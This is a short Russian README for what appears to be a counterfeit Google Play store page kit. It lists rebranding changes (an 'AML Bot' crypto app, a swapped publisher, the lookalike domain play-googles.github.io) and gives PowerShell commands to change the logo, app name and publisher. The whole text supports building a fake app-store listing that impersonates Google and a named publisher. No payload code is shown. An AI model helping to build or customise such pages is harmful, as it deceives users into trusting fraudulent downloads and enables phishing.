# Глобальная сборка Play-Google Store

## 📦 Что изменено по сравнению с оригиналом
- Заменены иконки на свои (`images/amlbot_logo.jpg` для ПК и `images/android_amlbot_logo.png` для мобильной версии).
- Обновлены метатеги и название проекта: **AML Bot** вместо *MyToken-Crypto OnChain Tracker*.
- Издатель изменён на **Intelligence Limited**.
- Текст "Официальный сайт ..." заменён на:  
  **AML Bot - Apps on Google Play  
  Intelligence Limited**
- Все ссылки на `play-googles.github.io` заменены на официальные:
  - https://accounts.google.com/ServiceLogin
  - https://play.google.com/apps
  - https://myaccount.google.com

## 🛠 Как менять лого, название и ссылки

Все изменения выполняются через скрипт **update.ps1**.

### 🔹 Изменить иконку (ПК/мобильная версия)
```powershell
.\update.ps1 -LogoPC "images/new_logo.jpg" -LogoMobile "images/new_logo_android.png"
```

### 🔹 Изменить название приложения
```powershell
.\update.ps1 -AppName "Новое Название"
```

### 🔹 Изменить издателя
```powershell
.\update.ps1 -Publisher "New Company Ltd."
```

### 🔹 Откатиться к оригинальной версии
Бэкап хранится в папке **backup_global**.

Чтобы восстановить:
```powershell
Copy-Item -Recurse -Force backup_global\* .
```
